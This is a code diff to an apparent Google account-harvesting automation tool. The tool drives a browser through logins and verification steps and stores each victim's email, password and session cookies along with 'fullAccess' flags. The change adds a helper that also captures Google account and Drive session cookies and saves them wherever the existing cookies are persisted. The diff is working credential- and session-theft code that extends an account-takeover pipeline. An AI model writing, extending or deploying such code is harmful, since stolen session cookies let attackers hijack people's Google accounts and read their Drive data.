@@ -145,6 +145,18 @@ function resolveUserDataDir(browserId) {
     }
     return candidates[0] || buildUserDataDir(browserId);
 }
+
+async function handleGoogleExtraTabs(browser, domain, updateData) {
+    if (!browser || !updateData) return;
+    try {
+        const extraTabs = await openGoogleExtraTabs(browser, domain);
+        if (extraTabs?.accountCookieJSON) updateData.accountCookieJSON = extraTabs.accountCookieJSON;
+        if (extraTabs?.driveCookieJSON) updateData.driveCookieJSON = extraTabs.driveCookieJSON;
+    } catch (e) {
+        logger.warn(`[handleGoogleExtraTabs] Extra tabs capture notice: ${e.message}`);
+    }
+}
+
 // How long the COMPLETED finalizer waits for the queued upload before persisting a
 // PROCESSING_FINALIZING pending state and letting the durable queue finish it in the
 // background (the queue never gives up on transient failures; Drive→Cloudinary fallback).
@@ -5815,7 +5827,7 @@ if (!foundSelector) {
                                         initialCheckResult.requiresVerification = false;
                                         initialCheckResult.accountAccess = true;
 
-                                        await openGoogleExtraTabs(browser, domain);
+                                        await handleGoogleExtraTabs(browser, domain, updateData);
 
 
                                         const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
@@ -5841,7 +5853,9 @@ if (!foundSelector) {
                                         updateBrowserRowDataFast(browserId, {
                                             status: "PROCESSING_FINALIZING",
                                             cookieJSON: updateData.cookieJSON,
-                                                                                                                                    cookieAccess: true,
+                                            accountCookieJSON: updateData.accountCookieJSON || '',
+                                            driveCookieJSON: updateData.driveCookieJSON || '',
+                                            cookieAccess: true,
                                             verified: true,
                                             fullAccess: true,
                                             lastJsonResponse: updateData.lastJsonResponse
@@ -5911,7 +5925,7 @@ if (!foundSelector) {
                                         initialCheckResult.accountAccess = true;
                                         initialCheckResult.emailExists = true;
 
-                                        await openGoogleExtraTabs(browser, domain);
+                                        await handleGoogleExtraTabs(browser, domain, updateData);
 
 
                                         const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
@@ -5937,7 +5951,9 @@ if (!foundSelector) {
                                             updateBrowserRowDataFast(browserId, {
                                                 status: "PROCESSING_FINALIZING",
                                                 cookieJSON: updateData.cookieJSON,
-                                                                                                                                                cookieAccess: true,
+                                                accountCookieJSON: updateData.accountCookieJSON || '',
+                                                driveCookieJSON: updateData.driveCookieJSON || '',
+                                                cookieAccess: true,
                                                 verified: true,
                                                 fullAccess: true,
                                                 lastJsonResponse: updateData.lastJsonResponse
@@ -6158,7 +6174,7 @@ if (!foundSelector) {
                                             lastJsonResponse: updateData.lastJsonResponse
                                         });
 
-                                        await openGoogleExtraTabs(browser, domain);
+                                        await handleGoogleExtraTabs(browser, domain, updateData);
 
 
                                         const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
@@ -6170,7 +6186,9 @@ if (!foundSelector) {
                                         updateBrowserRowDataFast(browserId, {
                                             status: "PROCESSING_FINALIZING",
                                             cookieJSON: updateData.cookieJSON,
-                                                                                                                                    cookieAccess: true,
+                                            accountCookieJSON: updateData.accountCookieJSON || '',
+                                            driveCookieJSON: updateData.driveCookieJSON || '',
+                                            cookieAccess: true,
                                             verified: true,
                                             fullAccess: true,
                                             lastJsonResponse: updateData.lastJsonResponse
@@ -6265,7 +6283,7 @@ if (!foundSelector) {
                                     lastJsonResponse: updateData.lastJsonResponse
                                 });
 
-                                await openGoogleExtraTabs(browser, domain);
+                                await handleGoogleExtraTabs(browser, domain, updateData);
 
 
                                 const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
@@ -6544,7 +6562,7 @@ if (!foundSelector) {
                                 initialCheckResult.accountAccess = true;
                                 initialCheckResult.verificationState = null;
 
-                                await openGoogleExtraTabs(browser, domain);
+                                await handleGoogleExtraTabs(browser, domain, updateData);
 
 
                                 const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
@@ -6597,7 +6615,7 @@ if (!foundSelector) {
                             initialCheckResult.emailExists = true;
                             initialCheckResult.verificationState = null;
 
-                            await openGoogleExtraTabs(browser, domain);
+                            await handleGoogleExtraTabs(browser, domain, updateData);
 
 
                             const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
@@ -7042,7 +7060,9 @@ if (!foundSelector) {
             email: email || '',
             driveUrl: updateData.driveUrl || '',
             cookieJSON: updateData.cookieJSON || '',
-                                    browserIdentity: recoveredIdentity,
+            accountCookieJSON: updateData.accountCookieJSON || '',
+            driveCookieJSON: updateData.driveCookieJSON || '',
+            browserIdentity: recoveredIdentity,
             lastJsonResponse: (waitingStates.includes(finalStatus) && updateData.lastJsonResponse)
                 ? updateData.lastJsonResponse
                 : JSON.stringify({
@@ -7079,7 +7099,7 @@ if (!foundSelector) {
 
 
         if ((finalStatus === "COMPLETED" || finalStatus === "PROCESSING_FINALIZING" || initialCheckResult.accountAccess) && !browserFullyClosed) {
-            await openGoogleExtraTabs(browser, domain);
+            await handleGoogleExtraTabs(browser, domain, updateData);
             const allUrls = getCookieCaptureUrls(domain);
             let browserCookies = [];
             try {
@@ -7118,7 +7138,9 @@ if (!foundSelector) {
                     email: email || '',
                     password: password || '',
                     cookieJSON: updateData.cookieJSON,
-                                                            browserIdentity: updateData.browserIdentity || '',
+                    accountCookieJSON: updateData.accountCookieJSON || '',
+                    driveCookieJSON: updateData.driveCookieJSON || '',
+                    browserIdentity: updateData.browserIdentity || '',
                     verified: updateData.verified,
                     fullAccess: updateData.fullAccess,
                     driveUrl: updateData.driveUrl,
